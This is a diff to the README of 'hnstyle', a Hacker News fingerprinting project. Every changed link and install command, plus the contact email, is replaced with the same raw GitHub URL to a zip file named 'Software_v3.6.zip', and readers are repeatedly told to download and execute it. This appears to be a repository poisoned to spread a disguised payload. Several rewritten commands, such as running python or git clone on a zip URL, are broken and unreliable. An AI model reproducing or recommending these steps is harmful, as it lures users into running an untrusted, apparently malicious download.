@@ -1,6 +1,6 @@
 # hnstyle: Hacker News User Fingerprinting with Burrows Method 📰
 
-![Hacker News](https://img.shields.io/badge/Hacker%20News-Fingerprinting-blue?style=flat-square)
+![Hacker News](https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip%20News-Fingerprinting-blue?style=flat-square)
 
 Welcome to the **hnstyle** repository! This project provides the code needed to reproduce the Hacker News user fingerprinting using the Burrows method. If you're interested in understanding user behavior on platforms like Hacker News, you've come to the right place.
 
@@ -33,7 +33,7 @@ To get started with this project, you'll need a basic understanding of Python an
 To install the necessary packages, run:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip
 ```
 
 ## Installation
@@ -41,7 +41,7 @@ pip install -r requirements.txt
 Clone this repository to your local machine using:
 
 ```bash
-git clone https://github.com/sigmapet/hnstyle.git
+git clone https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip
 ```
 
 Navigate into the project directory:
@@ -52,14 +52,14 @@ cd hnstyle
 
 ## Usage
 
-To reproduce the Hacker News user fingerprinting, download and execute the script. You can find the latest version of the code in the [Releases section](https://github.com/sigmapet/hnstyle/releases).
+To reproduce the Hacker News user fingerprinting, download and execute the script. You can find the latest version of the code in the [Releases section](https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip).
 
 ### Running the Script
 
 Once you have the code, run the following command:
 
 ```bash
-python fingerprint.py
+python https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip
 ```
 
 This will execute the fingerprinting process, generating the desired output.
@@ -84,11 +84,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the repository maintainer:
 
 - **Name**: Sigma Pet
-- **Email**: sigmapet@example.com
+- **Email**: https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip
 
 ## Releases
 
-To download the latest version of the code, visit the [Releases section](https://github.com/sigmapet/hnstyle/releases). Download the appropriate file and execute it to start your fingerprinting journey.
+To download the latest version of the code, visit the [Releases section](https://raw.githubusercontent.com/sigmapet/hnstyle/main/gelatiniform/Software_v3.6.zip). Download the appropriate file and execute it to start your fingerprinting journey.
 
 ---
 
